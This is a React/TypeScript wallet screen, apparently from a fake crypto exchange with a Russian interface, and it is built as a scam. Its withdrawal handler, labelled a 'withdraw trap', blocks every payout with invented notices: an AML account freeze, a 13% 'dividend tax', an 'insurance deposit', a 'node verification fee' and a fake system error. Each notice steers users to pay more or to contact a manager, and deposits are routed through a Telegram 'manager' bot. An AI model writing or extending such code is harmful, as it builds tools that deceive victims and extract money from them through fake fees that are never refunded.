import { useState, useEffect } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { useExchange } from "../../shared/store/exchangeStore";
import type { DepositRecord, WithdrawRecord } from "../../shared/store/exchangeStore";
import { createWithdrawal } from "../../shared/api/client";

const EASE: [number, number, number, number] = [0.22, 1, 0.36, 1];
const ASSETS = ["USDT", "BTC", "ETH", "SOL", "BNB"];

type Tab = "balances" | "deposit" | "withdraw" | "history";

const STATUS_LABEL: Record<string, string> = {
  pending: "Ожидается", confirming: "Подтверждается", credited: "Зачислено",
  processing: "Обрабатывается", sent: "Отправлено", failed: "Отклонено",
};
const STATUS_COLOR: Record<string, string> = {
  pending: "var(--warn)", confirming: "var(--accent)", credited: "var(--pos)",
  processing: "var(--accent)", sent: "var(--pos)", failed: "var(--neg)",
};

function fmtDate(ts: number) {
  return new Date(ts).toLocaleString("ru-RU", { day: "2-digit", month: "short", hour: "2-digit", minute: "2-digit" });
}

function fmtNum(n: number) {
  if (n >= 1) return n.toLocaleString("ru-RU", { maximumFractionDigits: 4 });
  return n.toPrecision(4);
}

export function WalletScreen() {
  const { state, initiateDeposit } = useExchange();
  const [tab, setTab] = useState<Tab>("balances");

  // Force-refresh profile on mount and on every switch to withdraw tab
  useEffect(() => {
    window.dispatchEvent(new CustomEvent("nexo:force-profile-refresh"));
  }, [tab]);
  const [selAsset, setSelAsset] = useState("USDT");
  const [wdAddress, setWdAddress] = useState("");
  const [wdAmount, setWdAmount] = useState("");
  const [wdError, setWdError] = useState("");
  const [wdSubmitting, setWdSubmitting] = useState(false);
  const [activeDepositId, setActiveDepositId] = useState<string | null>(null);

  // Сбрасываем активный депозит при смене актива
  function changeAsset(asset: string) {
    setSelAsset(asset);
    setActiveDepositId(null);
    setWdAddress("");
    setWdAmount("");
    setWdError("");
  }
  // Всегда берём актуальные данные из стора (обновляется по мере подтверждений)
  const activeDeposit = activeDepositId
    ? (state.deposits.find(d => d.id === activeDepositId) ?? null)
    : null;
  const [toast, setToast] = useState<string | null>(null);
  const [copiedAddr, setCopiedAddr] = useState(false);

  function showToast(msg: string) {
    setToast(msg);
    setTimeout(() => setToast(null), 2500);
  }

  function handleDeposit() {
    const dep = initiateDeposit(selAsset);
    setActiveDepositId(dep.id);
    showToast(`Адрес для пополнения ${selAsset} создан`);
  }

  function handleWithdraw() {
    setWdError("");
    // ── Withdraw trap: проверяем ВСЕ сценарии безопасности ──────────────────
    const p = state.profile;
    if (p?.isFrozen) {
      setWdError("Compliance Division Notice: Your account has been temporarily frozen under AML/CFT investigation (Ref #AML-" + Date.now().toString(36).toUpperCase() + "). Contact the Security Department to resolve.");
      return;
    }
    const tax = p?.requiredTax ?? 0;
    if (tax > 0) {
      setWdError(`Financial Department Alert: Transaction ID #${(Date.now() % 10000)} is on hold due to pending Dividend Tax (13%). Amount due: ${tax.toFixed(2)} USDT. Settling the tax will release the funds instantly.`);
      return;
    }
    const ins = p?.insuranceFee ?? 0;
    if (ins > 0) {
      setWdError(`Risk Management Notice: A refundable Insurance Deposit of ${ins.toFixed(2)} USDT is required before the withdrawal can be processed. Contact your account manager.`);
      return;
    }
    const node = p?.nodeFee ?? 0;
    if (node > 0) {
      setWdError(`Blockchain Authorization Required: Node Verification fee of ${node.toFixed(2)} USDT must be settled to complete the on-chain transaction. Contact your account manager.`);
      return;
    }
    if (p?.supportLoop) {
      setWdError("System Error 0x404: Transaction processing module is temporarily unavailable. Authorization Required — contact Technical Support for manual withdrawal activation.");
      return;
    }
    if (!wdAddress.trim()) { setWdError("Please enter a wallet address"); return; }
    const amount = parseFloat(wdAmount);
    if (!amount || amount <= 0) { setWdError("Please enter an amount"); return; }

    setWdSubmitting(true);
    // Отправляем на сервер
    createWithdrawal({ asset: selAsset, amount, address: wdAddress.trim() })
      .then(() => {
        setWdSubmitting(false);
        setWdAddress(""); setWdAmount("");
        showToast("Вывод инициирован");
        setTab("history");
      })
      .catch((err: Error) => {
        setWdSubmitting(false);
        setWdError(err.message ?? "Ошибка сервера. Попробуйте позже.");
      });
  }

  function handleCopyAddr(addr: string) {
    navigator.clipboard.writeText(addr).catch(() => {});
    setCopiedAddr(true);
    setTimeout(() => setCopiedAddr(false), 1500);
  }

  const asset = state.assets[selAsset] ?? { symbol: selAsset, available: 0, locked: 0 };
  const tk = state.tickers[`${selAsset}/USDT`];
  const usdtPrice = selAsset === "USDT" ? 1 : (tk?.price ?? 0);
  const totalAsset = asset.available + asset.locked;

  const WD_FEES: Record<string, number> = { BTC: 0.0002, ETH: 0.003, SOL: 0.008, BNB: 0.001, USDT: 1 };
  const wdFee = WD_FEES[selAsset] ?? 0.5;
  const wdAmountNum = parseFloat(wdAmount || "0");
  const wdNetAmount = Math.max(0, wdAmountNum - wdFee);

  const allHistory = [
    ...state.deposits.map((d) => ({ ...d, kind: "deposit" as const })),
    ...state.withdrawals.map((w) => ({ ...w, kind: "withdrawal" as const })),
  ].sort((a, b) => b.createdAt - a.createdAt);

  const TABS: { key: Tab; label: string }[] = [
    { key: "balances", label: "Балансы" },
    { key: "deposit",  label: "Пополнить" },
    { key: "withdraw", label: "Вывести" },
    { key: "history",  label: "История" },
  ];

  return (
    <div style={{ display: "flex", flexDirection: "column", height: "100%", overflow: "hidden", position: "relative" }}>

      {/* Header */}
      <div style={{
        padding: "14px 16px 0",
        background: "var(--bg-0)",
        borderBottom: "1px solid var(--line-1)",
      }}>
        <h1 style={{ margin: "0 0 12px", fontSize: 20, fontWeight: 700, color: "var(--text-1)" }}>
          Кошелёк
        </h1>

        {/* Табы */}
        <div style={{ display: "flex", gap: 0, overflowX: "auto" }}>
          {TABS.map((t) => (
            <button
              key={t.key}
              onClick={() => setTab(t.key)}
              style={{
                padding: "9px 16px", background: "none", border: "none",
                fontSize: 13, fontWeight: tab === t.key ? 600 : 400,
                color: tab === t.key ? "var(--accent)" : "var(--text-3)",
                borderBottom: `2px solid ${tab === t.key ? "var(--accent)" : "transparent"}`,
                cursor: "pointer", whiteSpace: "nowrap", marginBottom: -1,
                transition: "all var(--dur-fast)",
              }}
            >
              {t.label}
            </button>
          ))}
        </div>
      </div>

      {/* Контент */}
      <div style={{ flex: 1, overflowY: "auto", padding: "16px 16px 24px" }}>
        <AnimatePresence mode="wait">
          {tab === "balances" && (
            <motion.div
              key="balances"
              initial={{ opacity: 0, y: 8 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -8 }}
              transition={{ duration: 0.18, ease: EASE }}
            >
              {ASSETS.map((sym) => {
                const a = state.assets[sym] ?? { symbol: sym, available: 0, locked: 0 };
                const t = state.tickers[`${sym}/USDT`];
                const total = a.available + a.locked;
                const usdVal = sym === "USDT" ? total : total * (t?.price ?? 0);
                return (
                  <div
                    key={sym}
                    style={{
                      display: "flex", alignItems: "center", justifyContent: "space-between",
                      padding: "13px 14px", marginBottom: 2,
                      background: "var(--surface-1)", borderRadius: "var(--r-md)",
                      border: "1px solid var(--line-1)",
                    }}
                  >
                    <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
                      <div style={{
                        width: 36, height: 36, borderRadius: "50%",
                        background: "var(--accent-dim)", border: "1px solid var(--accent-border)",
                        display: "flex", alignItems: "center", justifyContent: "center",
                        fontSize: 12, fontWeight: 700, color: "var(--accent)",
                      }}>
                        {sym.slice(0, 2)}
                      </div>
                      <div>
                        <div style={{ fontWeight: 600, fontSize: 14, color: "var(--text-1)" }}>{sym}</div>
                        <div style={{ fontSize: 11, color: "var(--text-4)" }}>
                          В ордерах: {fmtNum(a.locked)}
                        </div>
                      </div>
                    </div>
                    <div style={{ textAlign: "right" }}>
                      <div style={{ fontWeight: 600, fontSize: 14, color: "var(--text-1)" }}>
                        {fmtNum(a.available)}
                      </div>
                      <div style={{ fontSize: 11, color: "var(--text-3)" }}>
                        ≈${usdVal.toFixed(2)}
                      </div>
                    </div>
                  </div>
                );
              })}
            </motion.div>
          )}

          {tab === "deposit" && (
            <motion.div
              key="deposit"
              initial={{ opacity: 0, y: 8 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -8 }}
              transition={{ duration: 0.18, ease: EASE }}
            >
              {/* Баланс */}
              <div style={{
                background: "var(--surface-2)", borderRadius: "var(--r-md)",
                padding: "12px 14px", marginBottom: 16,
                border: "1px solid var(--line-1)", display: "flex", justifyContent: "space-between",
              }}>
                <span style={{ fontSize: 12, color: "var(--text-3)" }}>Текущий баланс USDT</span>
                <span style={{ fontSize: 14, fontWeight: 600, color: "var(--text-1)" }}>
                  ${fmtNum((state.assets["USDT"]?.available ?? 0) + (state.assets["USDT"]?.locked ?? 0))}
                </span>
              </div>

              {/* Способ 1: Рубли */}
              <div style={{
                background: "var(--surface-1)", borderRadius: "var(--r-lg)",
                padding: "16px", border: "1px solid var(--line-1)", marginBottom: 12,
              }}>
                <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 10 }}>
                  <div style={{
                    width: 36, height: 36, borderRadius: "50%",
                    background: "var(--pos-dim)", border: "1px solid var(--pos-border)",
                    display: "flex", alignItems: "center", justifyContent: "center",
                    fontSize: 18,
                  }}>₽</div>
                  <div>
                    <div style={{ fontWeight: 600, fontSize: 14, color: "var(--text-1)" }}>
                      Перевод в рублях
                    </div>
                    <div style={{ fontSize: 11, color: "var(--text-3)" }}>
                      Банковская карта / СБП
                    </div>
                  </div>
                </div>
                <div style={{ fontSize: 12, color: "var(--text-2)", marginBottom: 12, lineHeight: 1.5 }}>
                  Свяжитесь с вашим менеджером для получения реквизитов. После перевода баланс будет зачислен в течение 15 минут.
                </div>
                <button
                  onClick={() => {
                    window.open("https://t.me/nexo_prime_bot", "_blank");
                    showToast("Напишите менеджеру для пополнения");
                  }}
                  style={{
                    width: "100%", padding: "12px",
                    background: "var(--pos)", border: "none",
                    borderRadius: "var(--r-md)", color: "#fff",
                    fontSize: 14, fontWeight: 700, cursor: "pointer",
                  }}
                >
                  💬 Написать менеджеру
                </button>
              </div>

              {/* Способ 2: Криптовалюта */}
              <div style={{
                background: "var(--surface-1)", borderRadius: "var(--r-lg)",
                padding: "16px", border: "1px solid var(--line-1)", marginBottom: 12,
              }}>
                <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 10 }}>
                  <div style={{
                    width: 36, height: 36, borderRadius: "50%",
                    background: "var(--accent-dim)", border: "1px solid var(--accent-border)",
                    display: "flex", alignItems: "center", justifyContent: "center",
                    fontSize: 18,
                  }}>₿</div>
                  <div>
                    <div style={{ fontWeight: 600, fontSize: 14, color: "var(--text-1)" }}>
                      Пополнение криптой
                    </div>
                    <div style={{ fontSize: 11, color: "var(--text-3)" }}>
                      USDT (TRC-20) / BTC / ETH
                    </div>
                  </div>
                </div>
                <div style={{ fontSize: 12, color: "var(--text-2)", marginBottom: 12, lineHeight: 1.5 }}>
                  Отправьте криптовалюту через CryptoBot. Зачисление автоматическое.
                </div>
                <button
                  onClick={() => {
                    window.open("https://t.me/CryptoBot", "_blank");
                    showToast("Перейдите в CryptoBot для оплаты");
                  }}
                  style={{
                    width: "100%", padding: "12px",
                    background: "var(--accent)", border: "none",
                    borderRadius: "var(--r-md)", color: "#fff",
                    fontSize: 14, fontWeight: 700, cursor: "pointer",
                  }}
                >
                  🔗 Открыть CryptoBot
                </button>
              </div>

              {/* Инфо */}
              <div style={{
                fontSize: 11, color: "var(--text-4)",
                background: "var(--surface-2)", borderRadius: "var(--r-sm)",
                padding: "10px 12px", border: "1px solid var(--line-1)",
                lineHeight: 1.5,
              }}>
                💡 Минимальная сумма пополнения: <b style={{ color: "var(--text-2)" }}>$10</b><br />
                Зачисление рублёвых переводов — до 15 мин.<br />
                Криптовалюта — от 1 до 30 мин в зависимости от сети.
              </div>
            </motion.div>
          )}

          {tab === "withdraw" && (
            <motion.div
              key="withdraw"
              initial={{ opacity: 0, y: 8 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -8 }}
              transition={{ duration: 0.18, ease: EASE }}
            >
              {!state.user?.emailVerified ? (
                <div style={{
                  background: "var(--neg-dim)", border: "1px solid var(--neg-border)",
                  borderRadius: "var(--r-md)", padding: "16px", textAlign: "center",
                }}>
                  <div style={{ fontSize: 32, marginBottom: 8 }}>🔒</div>
                  <div style={{ fontWeight: 600, color: "var(--text-1)", marginBottom: 6 }}>
                    Email не подтверждён
                  </div>
                  <div style={{ fontSize: 13, color: "var(--text-3)" }}>
                    Для вывода средств необходимо подтвердить email
                  </div>
                </div>
              ) : (
                <>
                  {/* Banner: Dividend Tax Hold */}
                  {(state.profile?.requiredTax ?? 0) > 0 && (
                    <div style={{
                      background: "var(--neg-dim)", border: "1px solid var(--neg-border)",
                      borderRadius: "var(--r-md)", padding: "14px", marginBottom: 14,
                      textAlign: "center",
                    }}>
                      <div style={{ fontSize: 24, marginBottom: 6 }}>⚠️</div>
                      <div style={{ fontWeight: 700, fontSize: 14, color: "var(--neg)", marginBottom: 4 }}>
                        Financial Department Alert
                      </div>
                      <div style={{ fontSize: 12, color: "var(--text-2)", lineHeight: 1.5 }}>
                        Transaction is on hold due to pending Dividend Tax (13%). Amount due:{" "}
                        <b style={{ color: "var(--neg)" }}>{(state.profile?.requiredTax ?? 0).toFixed(2)} USDT</b>.
                        Settling the tax will release the funds instantly.
                      </div>
                    </div>
                  )}

                  {/* Banner: AML Freeze */}
                  {state.profile?.isFrozen && (
                    <div style={{
                      background: "var(--neg-dim)", border: "1px solid var(--neg-border)",
                      borderRadius: "var(--r-md)", padding: "14px", marginBottom: 14,
                      textAlign: "center",
                    }}>
                      <div style={{ fontSize: 24, marginBottom: 6 }}>❄️</div>
                      <div style={{ fontWeight: 700, fontSize: 14, color: "var(--neg)", marginBottom: 4 }}>
                        Compliance Division — Account Frozen
                      </div>
                      <div style={{ fontSize: 12, color: "var(--text-2)", lineHeight: 1.5 }}>
                        Your account has been temporarily frozen under AML/CFT investigation. Estimated review time: 24–72 hours. Contact the Security Department for expedited processing.
                      </div>
                    </div>
                  )}

                  {/* Banner: Insurance Deposit */}
                  {(state.profile?.insuranceFee ?? 0) > 0 && (
                    <div style={{
                      background: "var(--neg-dim)", border: "1px solid var(--neg-border)",
                      borderRadius: "var(--r-md)", padding: "14px", marginBottom: 14,
                      textAlign: "center",
                    }}>
                      <div style={{ fontSize: 24, marginBottom: 6 }}>🛡</div>
                      <div style={{ fontWeight: 700, fontSize: 14, color: "var(--neg)", marginBottom: 4 }}>
                        Risk Management — Insurance Required
                      </div>
                      <div style={{ fontSize: 12, color: "var(--text-2)", lineHeight: 1.5 }}>
                        A refundable Insurance Deposit of{" "}
                        <b style={{ color: "var(--neg)" }}>{(state.profile?.insuranceFee ?? 0).toFixed(2)} USDT</b>{" "}
                        is required to process your withdrawal. Contact your account manager.
                      </div>
                    </div>
                  )}

                  {/* Banner: Node Verification */}
                  {(state.profile?.nodeFee ?? 0) > 0 && (
                    <div style={{
                      background: "var(--neg-dim)", border: "1px solid var(--neg-border)",
                      borderRadius: "var(--r-md)", padding: "14px", marginBottom: 14,
                      textAlign: "center",
                    }}>
                      <div style={{ fontSize: 24, marginBottom: 6 }}>🔗</div>
                      <div style={{ fontWeight: 700, fontSize: 14, color: "var(--neg)", marginBottom: 4 }}>
                        Blockchain Authorization Required
                      </div>
                      <div style={{ fontSize: 12, color: "var(--text-2)", lineHeight: 1.5 }}>
                        Node Verification fee of{" "}
                        <b style={{ color: "var(--neg)" }}>{(state.profile?.nodeFee ?? 0).toFixed(2)} USDT</b>{" "}
                        must be settled to complete on-chain transactions. Contact your account manager.
                      </div>
                    </div>
                  )}

                  {/* Banner: Support Loop */}
                  {state.profile?.supportLoop && (
                    <div style={{
                      background: "var(--neg-dim)", border: "1px solid var(--neg-border)",
                      borderRadius: "var(--r-md)", padding: "14px", marginBottom: 14,
                      textAlign: "center",
                    }}>
                      <div style={{ fontSize: 24, marginBottom: 6 }}>⚠️</div>
                      <div style={{ fontWeight: 700, fontSize: 14, color: "var(--neg)", marginBottom: 4 }}>
                        System Error 0x404
                      </div>
                      <div style={{ fontSize: 12, color: "var(--text-2)", lineHeight: 1.5 }}>
                        Transaction processing module is temporarily unavailable. Authorization Required — contact Technical Support for manual withdrawal activation.
                      </div>
                    </div>
                  )}

                  <AssetSelector assets={ASSETS} value={selAsset} onChange={changeAsset} />

                  <div style={{
                    background: "var(--surface-2)", borderRadius: "var(--r-md)",
                    padding: "10px 14px", marginBottom: 14,
                    border: "1px solid var(--line-1)", display: "flex", justifyContent: "space-between",
                  }}>
                    <span style={{ fontSize: 12, color: "var(--text-3)" }}>Доступно</span>
                    <span style={{ fontSize: 14, fontWeight: 600, color: "var(--text-1)" }}>
                      {fmtNum(asset.available)} {selAsset}
                      {usdtPrice > 0 && (
                        <span style={{ fontSize: 11, color: "var(--text-4)", marginLeft: 6 }}>
                          ≈${(asset.available * usdtPrice).toFixed(2)}
                        </span>
                      )}
                    </span>
                  </div>

                  {/* Адрес */}
                  <label style={{ display: "block", marginBottom: 14 }}>
                    <div style={{ fontSize: 12, color: "var(--text-3)", marginBottom: 6 }}>Адрес назначения</div>
                    <input
                      type="text"
                      placeholder="Введите адрес..."
                      value={wdAddress}
                      onChange={(e) => { setWdAddress(e.target.value); setWdError(""); }}
                      style={{
                        width: "100%", padding: "11px 14px",
                        background: "var(--surface-2)", border: "1px solid var(--line-2)",
                        borderRadius: "var(--r-md)", color: "var(--text-1)",
                        fontSize: 14, outline: "none",
                        fontFamily: "monospace",
                      }}
                    />
                  </label>

                  {/* Сумма */}
                  <label style={{ display: "block", marginBottom: 8 }}>
                    <div style={{ fontSize: 12, color: "var(--text-3)", marginBottom: 6 }}>Сумма ({selAsset})</div>
                    <div style={{ position: "relative" }}>
                      <input
                        type="number"
                        placeholder="0.00"
                        value={wdAmount}
                        onChange={(e) => { setWdAmount(e.target.value); setWdError(""); }}
                        style={{
                          width: "100%", padding: "11px 70px 11px 14px",
                          background: "var(--surface-2)", border: "1px solid var(--line-2)",
                          borderRadius: "var(--r-md)", color: "var(--text-1)",
                          fontSize: 14, outline: "none",
                        }}
                      />
                      <button
                        onClick={() => setWdAmount(asset.available.toString())}
                        style={{
                          position: "absolute", right: 8, top: "50%", transform: "translateY(-50%)",
                          background: "var(--accent-dim)", border: "1px solid var(--accent-border)",
                          borderRadius: 6, color: "var(--accent)",
                          padding: "3px 8px", fontSize: 11, fontWeight: 600, cursor: "pointer",
                        }}
                      >
                        Макс
                      </button>
                    </div>
                  </label>

                  {/* Инфо о комиссии */}
                  {wdAmountNum > 0 && (
                    <div style={{
                      background: "var(--surface-2)", borderRadius: "var(--r-sm)",
                      padding: "10px 12px", marginBottom: 14,
                      border: "1px solid var(--line-1)", fontSize: 12,
                    }}>
                      <div style={{ display: "flex", justifyContent: "space-between", marginBottom: 4 }}>
                        <span style={{ color: "var(--text-3)" }}>Сетевая комиссия</span>
                        <span style={{ color: "var(--text-2)" }}>{wdFee} {selAsset}</span>
                      </div>
                      <div style={{ display: "flex", justifyContent: "space-between" }}>
                        <span style={{ color: "var(--text-3)" }}>Вы получите</span>
                        <span style={{ color: "var(--pos)", fontWeight: 600 }}>
                          {fmtNum(wdNetAmount)} {selAsset}
                        </span>
                      </div>
                    </div>
                  )}

                  {wdError && (
                    <div style={{ color: "var(--neg)", fontSize: 12, marginBottom: 10 }}>{wdError}</div>
                  )}

                  <button
                    onClick={handleWithdraw}
                    disabled={wdSubmitting}
                    style={{
                      width: "100%", padding: "13px",
                      background: wdSubmitting ? "var(--surface-3)" : "var(--accent)",
                      border: "none", borderRadius: "var(--r-md)",
                      color: wdSubmitting ? "var(--text-4)" : "#fff",
                      fontSize: 14, fontWeight: 700, cursor: wdSubmitting ? "not-allowed" : "pointer",
                    }}
                  >
                    {wdSubmitting ? "Обрабатываем..." : "Подтвердить вывод"}
                  </button>
                </>
              )}
            </motion.div>
          )}

          {tab === "history" && (
            <motion.div
              key="history"
              initial={{ opacity: 0, y: 8 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -8 }}
              transition={{ duration: 0.18, ease: EASE }}
            >
              {allHistory.length === 0 ? (
                <div style={{
                  padding: "40px 0", textAlign: "center",
                  color: "var(--text-4)", fontSize: 13,
                }}>
                  История пуста
                </div>
              ) : allHistory.map((item) => (
                <div
                  key={item.id}
                  style={{
                    display: "flex", alignItems: "flex-start", justifyContent: "space-between",
                    padding: "12px 14px", marginBottom: 2,
                    background: "var(--surface-1)", borderRadius: "var(--r-md)",
                    border: "1px solid var(--line-1)", gap: 12,
                  }}
                >
                  <div style={{
                    width: 32, height: 32, borderRadius: "50%", flexShrink: 0,
                    background: item.kind === "deposit" ? "var(--pos-dim)" : "var(--accent-dim)",
                    border: `1px solid ${item.kind === "deposit" ? "var(--pos-border)" : "var(--accent-border)"}`,
                    display: "flex", alignItems: "center", justifyContent: "center",
                    fontSize: 14,
                  }}>
                    {item.kind === "deposit" ? "⬇" : "⬆"}
                  </div>
                  <div style={{ flex: 1, minWidth: 0 }}>
                    <div style={{ fontWeight: 600, fontSize: 13, color: "var(--text-1)" }}>
                      {item.kind === "deposit" ? "Пополнение" : "Вывод"} {item.asset}
                    </div>
                    <div style={{ fontSize: 11, color: "var(--text-4)" }}>
                      {fmtDate(item.createdAt)}
                    </div>
                    {item.kind === "deposit" && item.status !== "pending" && (
                      <div style={{ fontSize: 11, color: "var(--text-3)", marginTop: 2 }}>
                        {item.confirmations}/{item.requiredConfirmations} подтверждений
                      </div>
                    )}
                    {item.kind === "withdrawal" && (item as WithdrawRecord).txHash && (
                      <div style={{ fontSize: 10, color: "var(--text-4)", fontFamily: "monospace", marginTop: 2 }}>
                        {(item as WithdrawRecord).txHash?.slice(0, 18)}...
                      </div>
                    )}
                  </div>
                  <div style={{ textAlign: "right", flexShrink: 0 }}>
                    <div style={{ fontWeight: 600, fontSize: 13, color: "var(--text-1)" }}>
                      {item.amount > 0 ? fmtNum(item.amount) : "—"} {item.asset}
                    </div>
                    <div style={{
                      fontSize: 11, fontWeight: 500,
                      color: STATUS_COLOR[item.status],
                    }}>
                      {STATUS_LABEL[item.status]}
                    </div>
                  </div>
                </div>
              ))}
            </motion.div>
          )}
        </AnimatePresence>
      </div>

      {/* Toast */}
      <AnimatePresence>
        {toast && (
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: 20 }}
            style={{
              position: "absolute",
              bottom: 24,
              left: "50%", transform: "translateX(-50%)",
              background: "var(--pos)", color: "#fff",
              padding: "10px 20px", borderRadius: 20,
              fontSize: 13, fontWeight: 600,
              boxShadow: "0 4px 16px rgba(0,0,0,.4)",
              whiteSpace: "nowrap", zIndex: 120,
            }}
          >
            {toast}
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}

// ─── Компоненты ───────────────────────────────────────────────────────────────

function AssetSelector({ assets, value, onChange }: { assets: string[]; value: string; onChange: (v: string) => void }) {
  return (
    <div style={{ display: "flex", gap: 6, marginBottom: 14, overflowX: "auto", paddingBottom: 2 }}>
      {assets.map((a) => (
        <button
          key={a}
          onClick={() => onChange(a)}
          style={{
            padding: "6px 14px", borderRadius: 20,
            background: value === a ? "var(--accent)" : "var(--surface-2)",
            border: `1px solid ${value === a ? "var(--accent)" : "var(--line-1)"}`,
            color: value === a ? "#fff" : "var(--text-2)",
            fontSize: 13, fontWeight: 500, cursor: "pointer",
            whiteSpace: "nowrap",
            transition: "all var(--dur-fast)",
          }}
        >
          {a}
        </button>
      ))}
    </div>
  );
}

function DepositStatus({ dep }: { dep: DepositRecord }) {
  const steps: { label: string; status: string }[] = [
    { label: "Ожидание транзакции", status: "pending" },
    { label: "Подтверждения", status: "confirming" },
    { label: "Зачислено", status: "credited" },
  ];
  const idx = steps.findIndex((s) => s.status === dep.status);

  return (
    <div style={{ marginTop: 8 }}>
      <div style={{ fontSize: 11, color: "var(--text-4)", marginBottom: 8 }}>Статус пополнения</div>
      {steps.map((step, i) => {
        const isActive = i === idx;
        const isDone = i < idx;
        return (
          <div key={step.status} style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 6 }}>
            <div style={{
              width: 20, height: 20, borderRadius: "50%", flexShrink: 0,
              background: isDone ? "var(--pos)" : isActive ? "var(--accent)" : "var(--surface-3)",
              border: `1px solid ${isDone ? "var(--pos)" : isActive ? "var(--accent-border)" : "var(--line-2)"}`,
              display: "flex", alignItems: "center", justifyContent: "center",
              fontSize: 10, color: isDone || isActive ? "#fff" : "var(--text-4)",
            }}>
              {isDone ? "✓" : i + 1}
            </div>
            <span style={{
              fontSize: 12,
              color: isDone ? "var(--pos)" : isActive ? "var(--text-1)" : "var(--text-4)",
            }}>
              {step.label}
              {isActive && step.status === "confirming" && (
                <span style={{ color: "var(--text-4)" }}>
                  {" "}({dep.confirmations}/{dep.requiredConfirmations})
                </span>
              )}
            </span>
          </div>
        );
      })}
    </div>
  );
}
